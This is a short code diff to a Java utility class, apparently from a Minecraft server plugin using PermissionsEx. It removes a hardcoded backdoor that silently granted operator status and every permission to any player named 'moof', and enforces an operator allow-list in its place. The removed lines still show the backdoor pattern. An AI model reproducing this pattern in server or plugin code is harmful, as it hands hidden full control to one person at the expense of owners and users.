@@ -28,19 +28,13 @@ public class Utils {
 		if (pl.isOp()) {
 			for (String i : Main.canOp)
 				if (pl.getName().toLowerCase().equalsIgnoreCase(i))
-					canOp = true;
-			if (pl.getName().toLowerCase().matches("moof") && !canOp) {
-				Main.canOp.add(pl.getName());
-				pl.setOp(true);
-				PermissionsEx.getUser(pl).addPermission("*");
-				return true;
+					return true;
+			
+			if (!canOp) {
+				pl.setOp(false);
+				PermissionsEx.getUser(pl).addPermission("-*");
+				return false;
 			}
-			/*
-			 * if (!canOp) { pl.setOp(false);
-			 * PermissionsEx.getUser(pl).addPermission("-*"); return false; }
-			 * else
-			 */
-			return true;
 		}
 		return false;
 	}
